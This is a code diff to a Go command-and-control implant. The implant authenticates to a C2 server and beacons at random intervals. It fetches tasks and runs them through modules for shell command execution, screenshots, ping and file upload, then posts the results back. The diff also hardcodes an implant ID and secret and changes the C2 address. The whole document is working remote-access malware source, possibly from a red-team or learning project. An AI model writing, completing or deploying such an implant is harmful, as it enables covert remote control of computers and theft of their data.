@@ -4,12 +4,13 @@ import (
 	"bytes"
 	"encoding/json"
 	"fmt"
+	"io"
 	"math/rand"
+	"net/http"
 	"os"
 	"os/exec"
 	"runtime"
 	"time"
-	"net/http"
 
 	"myimplant/modules"
 
@@ -24,8 +25,15 @@ type Implant struct {
 	Modules     map[string]modules.Module
 }
 
+type Task struct {
+	TaskID    string   `json:"task_id"`
+	ImplantID string   `json:"implant_id"`
+	TaskType  string   `json:"task_type"`
+	Command   string   `json:"cmd"`
+}
+
 func NewImplant(c2ServerURL string) *Implant {
-	ImplantID := get_id()
+	ImplantID := "93cce032-e473-4fda-9954-f67ef4a9d5a2"
 	return &Implant{
 		C2ServerURL: c2ServerURL,
 		Secret:      "e7bcc0ba5fb1dc9cc09460baaa2a6986",
@@ -40,10 +48,13 @@ func (i *Implant) Start() {
 		return
 	}
 
+
 	if err := i.login(); err != nil {
 		fmt.Println("Error logging in:", err)
 		return
 	}
+
+	i.Beaconing()
 
 }
 
@@ -61,7 +72,8 @@ func (i *Implant) sendOSInfo() error {
 		return fmt.Errorf("error marshaling OS info: %v", err)
 	}
 
-	_, err = i.sendHTTPRequest("POST", "/config", data, false)
+	_,_, err = i.sendHTTPRequest("POST", "/config", data, false)
+	
 	return err
 }
 
@@ -76,22 +88,20 @@ func (i *Implant) login() error {
 		return fmt.Errorf("error marshaling login data: %v", err)
 	}
 
-	resp, err := i.sendHTTPRequest("POST", "/login", data, false)
+	resp,body, err := i.sendHTTPRequest("POST", "/login", data, false)
 	if err != nil {
 		return err
 	}
-	fmt.Println("resp:", resp)
 	defer resp.Body.Close()
 
 	var response struct {
-		JWTToken string `json:"jwt_token"`
+		AccessToken string `json:"access_token"`
 	}
-	if err := json.NewDecoder(resp.Body).Decode(&response); err != nil {
-		return fmt.Errorf("error decoding login response: %v", err)
-	}
+	
+	_ = json.Unmarshal(body, &response)
+	
 
-	fmt.Println("response:", response)
-	i.JWTToken = response.JWTToken
+	i.JWTToken = response.AccessToken
 	return nil
 }
 
@@ -102,13 +112,14 @@ func (i *Implant) Beaconing() {
 		var Timer = time.Duration((rand.ExpFloat64() / 0.5) * float64(time.Second)) // random time between 0 and 5 seconds
 		tasks, err := i.fetchTasks()
 		if err != nil {
-			fmt.Println("Error fetching tasks:", err)
-			time.Sleep(Timer) // Sleep for a while before retrying
+			time.Sleep(Timer)
 			continue
 		}
 
+
 		for _, task := range tasks {
-			fmt.Println("Executing task:", task)
+			fmt.Println("Task:", task)
+
 			response, err := i.executeTask(task)
 			if err != nil {
 				fmt.Println("Error executing task:", err)
@@ -123,41 +134,39 @@ func (i *Implant) Beaconing() {
 	}
 }
 
-func (i *Implant) fetchTasks() ([]string, error) {
+func (i *Implant) fetchTasks() ([]Task, error) {
 
-	resp, err := i.sendHTTPRequest("GET", "/task", nil, true)
+	resp,body, err := i.sendHTTPRequest("GET", "/tasks", nil, true)
 
 	if err != nil {
 		return nil, fmt.Errorf("error fetching tasks: %v", err)
 	}
 	defer resp.Body.Close()
-
-	var tasks []string
-	err = json.NewDecoder(resp.Body).Decode(&tasks)
+	var tasks []Task
+	err = json.Unmarshal(body, &tasks)
 	if err != nil {
 		return nil, fmt.Errorf("error decoding tasks: %v", err)
 	}
-
 	return tasks, nil
 }
 
-func (i *Implant) executeTask(task string) (string, error) {
-	moduleName := task
+func (i *Implant) executeTask(task Task) (string, error) {
+	moduleName := task.TaskType
 	module, found := i.Modules[moduleName]
 	if !found {
 		return "", fmt.Errorf("module %s not found", moduleName)
 	}
 
 	// Execute module command
-	result, err := module.Execute("", nil)
+result, err := module.Execute(task.Command,nil)
 	if err != nil {
 		return "", fmt.Errorf("error executing module %s: %v", moduleName, err)
 	}
 
 	// Send response to C2 server
 	responseData := map[string]string{
-		"ImplantID": i.ImplantID,
-		"task":      task,
+		"implant_id": i.ImplantID,
+		"task_id":      task.TaskID,
 		"result":    result,
 		"timestamp": time.Now().Format(time.RFC3339),
 	}
@@ -166,7 +175,7 @@ func (i *Implant) executeTask(task string) (string, error) {
 		return "", fmt.Errorf("error marshaling response data: %v", err)
 	}
 
-	_, err = i.sendHTTPResponse("/tasks/response", responseDataBytes)
+	_,_, err = i.sendHTTPRequest("POST","/results", responseDataBytes,true)
 	if err != nil {
 		return "", fmt.Errorf("error sending task response: %v", err)
 	}
@@ -174,11 +183,11 @@ func (i *Implant) executeTask(task string) (string, error) {
 	return result, nil
 }
 
-func (i *Implant) sendHTTPRequest(method, path string, data []byte, includeToken bool) (*http.Response, error) {
+func (i *Implant) sendHTTPRequest(method, path string, data []byte, includeToken bool) (*http.Response, []byte, error) {
 	url := i.C2ServerURL + path
 	req, err := http.NewRequest(method, url, bytes.NewBuffer(data))
 	if err != nil {
-		return nil, fmt.Errorf("error creating HTTP request: %v", err)
+		return nil,nil, fmt.Errorf("error creating HTTP request: %v", err)
 	}
 	req.Header.Set("Content-Type", "application/json")
 	if includeToken && i.JWTToken != "" {
@@ -188,14 +197,13 @@ func (i *Implant) sendHTTPRequest(method, path string, data []byte, includeToken
 	client := &http.Client{}
 	resp, err := client.Do(req)
 	if err != nil {
-		return nil, fmt.Errorf("error sending HTTP request: %v", err)
+		return nil, nil,fmt.Errorf("error sending HTTP request: %v", err)
 	}
-	return resp, nil
+	body, _ := io.ReadAll(resp.Body)
+	
+	return resp, body,nil
 }
 
-func (i *Implant) sendHTTPResponse(path string, data []byte) (*http.Response, error) {
-	return i.sendHTTPRequest("POST", path, data, true)
-}
 
 func get_id() string {
 	const filePath = "C:\\Users\\Public\\Documents\\id.txt"
@@ -245,12 +253,12 @@ func getOSVersion() string {
 }
 
 func main() {
-	c2ServerURL := "http://192.168.0.113:5000"
+	c2ServerURL := "http://127.0.0.1:5000"
 
 	implant := NewImplant(c2ServerURL)
 
 	// Register modules
-	implant.Modules["exec"] = modules.NewExecuteModule()
+	implant.Modules["cmd"] = modules.NewExecuteModule()
 	implant.Modules["ping"] = modules.NewPingModule()
 	implant.Modules["screenshot"] = modules.NewScreenshotModule()
 	implant.Modules["upload"] = modules.NewUploadModule()
